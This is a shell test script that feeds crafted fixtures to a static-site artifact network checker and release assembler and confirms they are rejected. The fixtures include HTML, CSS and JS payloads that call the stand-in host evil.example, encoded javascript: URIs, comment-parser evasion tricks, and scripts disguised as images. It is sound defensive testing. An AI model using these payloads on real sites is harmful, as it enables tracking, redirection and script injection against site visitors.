#!/bin/sh
set -eu

ROOT=$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)
QUARTZ_CHECKOUT=${QUARTZ_CHECKOUT:-"$ROOT/../quartz"}
export QUARTZ_CHECKOUT
tmp_dir=$(mktemp -d "${TMPDIR:-/tmp}/mattkelly-artifact.XXXXXX")
trap 'rm -rf "$tmp_dir"' EXIT HUP INT TERM
artifact="$tmp_dir/artifact"
mkdir "$artifact"

expect_network_reject() {
  name=$1
  extension=$2
  content=$3
  fixture="$tmp_dir/$name"
  mkdir "$fixture"
  printf '%s\n' "$content" > "$fixture/case.$extension"
  if "$ROOT/bin/check-artifact-network" "$fixture" >/dev/null 2>&1; then
    printf 'artifact test: network fixture was accepted: %s\n' "$name" >&2
    exit 1
  fi
}

expect_browser_parser_reject() {
  name=$1
  expected_tag=$2
  content=$3
  fixture="$tmp_dir/browser-$name"
  mkdir "$fixture"
  printf '%s\n' "$content" > "$fixture/case.html"
  parsed_tags=$(python3 -c 'from html.parser import HTMLParser
import sys
class Tags(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.tags = []
    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
parser = Tags()
parser.feed(sys.argv[1])
print(" ".join(parser.tags))' "$content")
  case " $parsed_tags " in
    *" $expected_tag "*) ;;
    *) printf 'artifact test: comparison parser did not expose %s in %s\n' "$expected_tag" "$name" >&2; exit 1 ;;
  esac
  if "$ROOT/bin/check-artifact-network" "$fixture" >/dev/null 2>&1; then
    printf 'artifact test: checker accepted browser-visible comment payload: %s\n' "$name" >&2
    exit 1
  fi
}

write_gif() {
  printf 'GIF89a\001\000\001\000\200\000\000\000\000\000\377\377\377\041\371\004\001\000\000\000\000\054\000\000\000\000\001\000\001\000\000\002\002\104\001\000\073' > "$1"
}

expect_manifested_asset_reject() {
  name=$1
  mode=$2
  fixture="$tmp_dir/asset-$name"
  mkdir -p "$fixture/assets"
  printf '%s\n' '<!doctype html><html><head><link rel="stylesheet" href="/quartz/assets/site.css"><meta property="og:image" content="/quartz/assets/social.gif"></head><body><img src="/quartz/assets/social.gif" alt="fixture"></body></html>' > "$fixture/index.html"
  printf '%s\n' 'body { color: black; }' > "$fixture/assets/site.css"
  write_gif "$fixture/assets/social.gif"
  (
    cd "$fixture"
    shasum -a 256 index.html assets/site.css assets/social.gif > artifact-manifest.sha256
  )
  case "$mode" in
    missing) rm "$fixture/assets/social.gif" ;;
    undeclared) grep -v 'assets/social.gif$' "$fixture/artifact-manifest.sha256" > "$fixture/manifest.tmp" && mv "$fixture/manifest.tmp" "$fixture/artifact-manifest.sha256" ;;
    hash) printf 'tampered' >> "$fixture/assets/social.gif" ;;
    mime) printf '%s\n' '<!doctype html><script>alert(1)</script>' > "$fixture/assets/social.gif" ;;
  esac
  if "$ROOT/bin/check-artifact-network" "$fixture" >/dev/null 2>&1; then
    printf 'artifact test: manifested asset fixture was accepted: %s\n' "$name" >&2
    exit 1
  fi
}

expect_assembly_reject() {
  name=$1
  filename=$2
  content=$3
  fixture="$tmp_dir/assembly-$name"
  mkdir "$fixture"
  printf '%s\n' '<!doctype html><html><head><title>Fixture</title><link rel="canonical" href="/quartz"></head><body><h1>Fixture</h1></body></html>' > "$fixture/index.html"
  printf '%s\n' 'ARTIFACT_KIND=quartz-site' 'PUBLIC_BASE=/quartz' 'SOURCE_REVISION=0000000000000000000000000000000000000000' 'VALIDATION_SCOPE=integrity-and-route-contract' 'NETWORK_PROFILE=static-no-external-requests-v1' > "$fixture/artifact-contract.env"
  printf '%s\n' "$content" > "$fixture/$filename"
  (
    cd "$fixture"
    shasum -a 256 artifact-contract.env index.html "$filename" > artifact-manifest.sha256
  )
  if QUARTZ_ARTIFACT="$fixture" "$ROOT/bin/assemble-release" >/dev/null 2>&1; then
    printf 'artifact test: assembly fixture was accepted: %s\n' "$name" >&2
    exit 1
  fi
}

expect_special_entry_reject() {
  name=$1
  kind=$2
  fixture="$tmp_dir/special-$name"
  mkdir "$fixture"
  printf '%s\n' '<!doctype html><html><head><title>Fixture</title><link rel="canonical" href="/quartz"></head><body><h1>Fixture</h1></body></html>' > "$fixture/index.html"
  printf '%s\n' 'ARTIFACT_KIND=quartz-site' 'PUBLIC_BASE=/quartz' 'SOURCE_REVISION=0000000000000000000000000000000000000000' 'VALIDATION_SCOPE=integrity-and-route-contract' 'NETWORK_PROFILE=static-no-external-requests-v1' > "$fixture/artifact-contract.env"
  (
    cd "$fixture"
    shasum -a 256 artifact-contract.env index.html > artifact-manifest.sha256
  )
  case "$kind" in
    fifo) mkfifo "$fixture/undeclared.fifo" ;;
    socket) (cd "$fixture" && ruby -rsocket -e 'UNIXServer.new(ARGV.fetch(0)).close' undeclared.socket) ;;
    symlink) ln -s index.html "$fixture/undeclared.link" ;;
    manifest-symlink) rm "$fixture/artifact-manifest.sha256" && ln -s index.html "$fixture/artifact-manifest.sha256" ;;
  esac
  if "$ROOT/bin/check-artifact-network" "$fixture" >/dev/null 2>&1; then
    printf 'artifact test: network checker accepted special entry: %s\n' "$name" >&2
    exit 1
  fi
  if QUARTZ_ARTIFACT="$fixture" "$ROOT/bin/assemble-release" >/dev/null 2>&1; then
    printf 'artifact test: assembly accepted special entry: %s\n' "$name" >&2
    exit 1
  fi
}

safe="$tmp_dir/safe"
mkdir -p "$safe/assets"
printf '%s\n' '<!doctype html><html><head><link rel="canonical" href="/quartz"><link rel="stylesheet" href="/quartz/assets/site%2Ecss"><link rel="icon" href="/quartz/assets&#47;social.gif"><meta property="og:url" content="/quartz"><meta property="og:image" content="/quartz/assets/social.gif"></head><body><a href="/quartz/docs/">Local navigation</a><code>&lt;tag attr=&quot;value&quot;&gt;Tom &amp; Matt&#39; &#x2f;</code><img src="/quartz/assets/social.gif" alt="safe &amp; local"></body></html>' > "$safe/index.html"
printf '%s\n' 'body { width: 100%; color: black; }' > "$safe/assets/site.css"
write_gif "$safe/assets/social.gif"
(
  cd "$safe"
  shasum -a 256 index.html assets/site.css assets/social.gif > artifact-manifest.sha256
)
"$ROOT/bin/check-artifact-network" "$safe" >/dev/null

expect_network_reject img-double html '<img src="https://evil.example/x.png">'
expect_network_reject img-single html "<img src='https://evil.example/x.png'>"
expect_network_reject img-unquoted html '<img src=https://evil.example/x.png>'
expect_network_reject media html '<video poster="//evil.example/x"><source src=/local></video>'
expect_network_reject iframe-srcdoc html '<iframe srcdoc="<img src=https://evil.example/x>"></iframe>'
expect_network_reject mixed-malformed html '<ImG s r c = h t t p s : / / evil.example/x>'
expect_network_reject encoded-colon html '<img src="https&#58;//evil.example/x">'
expect_network_reject encoded-external-anchor html '<a href="&#x68;ttps&#58;&#47;&#47;evil.example/x">x</a>'
expect_network_reject encoded-protocol-relative html '<img src="&#47;&#47;evil.example/x.png">'
expect_network_reject encoded-control html '<a href="java&#10;script:alert(1)">x</a>'
expect_network_reject encoded-social-image html '<meta property="og:image" content="https&#58;&#47;&#47;evil.example/x.png">'
expect_network_reject malicious-named-entity html '<a href="&NewLine;//evil.example/x">x</a>'
expect_network_reject invalid-numeric-entity html '<code>&#x110000;</code>'
expect_network_reject html-comment html '<!-- comments are not allowed -->'
expect_network_reject spaced-comment-opener html '<! -- malformed opener -- >'
expect_network_reject malformed-comment-close html '<p>hidden payload</p>--!>'
expect_network_reject spaced-comment-close html '<p>hidden payload</p>-- ! >'
expect_network_reject redirect html '<meta http-equiv="refresh" content="0;url=https://evil.example">'
expect_network_reject event-handler html '<a href="/quartz" onClick="fetch(\"//evil.example\")">x</a>'
expect_network_reject external-anchor html '<a href="https://evil.example/">external</a>'
expect_network_reject preconnect html '<link rel="preconnect" href="/quartz/assets/">'
expect_network_reject inline-style html '<p style="color: red">x</p>'
expect_network_reject attributionsrc html '<a href="/quartz" attributionsrc="https://evil.example/register">x</a>'
expect_network_reject image-attributionsrc html '<img src="/quartz/assets/local.png" alt="x" attributionsrc="//evil.example/register">'
expect_network_reject unknown-request-attribute html '<img src="/quartz/assets/local.png" alt="x" imagesrcset="//evil.example/x.png">'
expect_network_reject social-video html '<meta property="og:video" content="https://evil.example/video.mp4">'
expect_network_reject social-audio html '<meta property="og:audio" content="/quartz/assets/audio.mp3">'
expect_network_reject twitter-player html '<meta name="twitter:player" content="/quartz/player">'
expect_network_reject missing-local-css html '<link rel="stylesheet" href="/quartz/assets/missing.css">'
expect_network_reject missing-local-image html '<img src="/quartz/assets/missing.png">'
expect_network_reject css-url css 'body{background:url(https://evil.example/x)}'
expect_network_reject css-import css '@IMPORT "//evil.example/x.css";'
expect_network_reject css-escaped-url css 'body{background:u\72l(https://evil.example/x)}'
expect_network_reject css-escaped-import css '@im\70ort "https://evil.example/x.css";'
expect_network_reject css-data css 'body{background:url(data:image/png;base64,AAAA)}'
expect_network_reject css-src-function css '@font-face{src:src(var(--font))}'
expect_network_reject js-fetch js 'fetch("https://evil.example")'
expect_network_reject js-xhr js 'new XMLHttpRequest()'
expect_network_reject js-websocket js 'new WebSocket("wss://evil.example")'
expect_network_reject js-import mjs 'import("https://evil.example/mod.js")'
expect_network_reject wasm-download wasm 'not actually wasm'
expect_network_reject rom-download rom 'not actually a ROM'
expect_network_reject qz-download qz 'fn main() {}'

expect_browser_parser_reject comment-meta-refresh meta '<!-- safe --!><meta http-equiv="refresh" content="0;url=https://evil.example"> -->'
expect_browser_parser_reject comment-hidden-image img '<!-- safe --!><img src="https://evil.example/pixel.png" alt=""> -->'

expect_manifested_asset_reject missing-file missing
expect_manifested_asset_reject missing-manifest-entry undeclared
expect_manifested_asset_reject hash-mismatch hash
expect_manifested_asset_reject mime-disguise mime

expect_special_entry_reject fifo fifo
expect_special_entry_reject socket socket
expect_special_entry_reject symlink symlink
expect_special_entry_reject manifest-symlink manifest-symlink

expect_assembly_reject payload-htm payload.htm '<!doctype html><img src="https://evil.example/x.png">'
expect_assembly_reject payload-xhtml payload.xhtml '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body>x</body></html>'
expect_assembly_reject external-svg image.svg '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/x.png"/></svg>'
expect_assembly_reject unknown-extension payload.unknown 'plain but unsupported served content'
expect_assembly_reject disguised-html image.png '<!doctype html><script src="https://evil.example/x.js"></script>'

printf '%s\n' '<!doctype html><html lang="en"><head><title>Quartz</title><meta name="description" content="Fixture"><link rel="canonical" href="/quartz"><meta property="og:title" content="Quartz"><meta property="og:description" content="Fixture"><meta property="og:type" content="website"><meta property="og:url" content="/quartz"><meta name="twitter:card" content="summary"></head><body><h1>Quartz artifact fixture</h1><code>&lt;safe&gt; &amp; &#35;</code></body></html>' > "$artifact/index.html"
printf '%s\n' 'ARTIFACT_KIND=quartz-site' 'PUBLIC_BASE=/quartz' 'SOURCE_REVISION=0000000000000000000000000000000000000000' 'VALIDATION_SCOPE=integrity-and-route-contract' 'NETWORK_PROFILE=static-no-external-requests-v1' > "$artifact/artifact-contract.env"
(
  cd "$artifact"
  shasum -a 256 artifact-contract.env index.html > artifact-manifest.sha256
)

QUARTZ_ARTIFACT="$artifact" "$ROOT/bin/assemble-release" >/dev/null
[ -s "$ROOT/dist/quartz/index.html" ]
[ ! -e "$ROOT/dist/quartz/artifact-contract.env" ]
[ ! -e "$ROOT/dist/quartz/artifact-manifest.sha256" ]
"$ROOT/test/routes.sh" >/dev/null

printf '%s\n' 'undeclared' > "$artifact/undeclared.txt"
if QUARTZ_ARTIFACT="$artifact" "$ROOT/bin/assemble-release" >/dev/null 2>&1; then
  printf '%s\n' 'artifact test: incomplete manifest was accepted' >&2
  exit 1
fi
rm "$artifact/undeclared.txt"

if QUARTZ_ARTIFACT="$artifact" "$ROOT/bin/build" >/dev/null 2>&1; then
  printf '%s\n' 'artifact test: core build accepted artifact injection' >&2
  exit 1
fi

"$ROOT/bin/build" >/dev/null
printf '%s\n' 'Quartz artifact integrity and active-network deny-profile tests passed.'
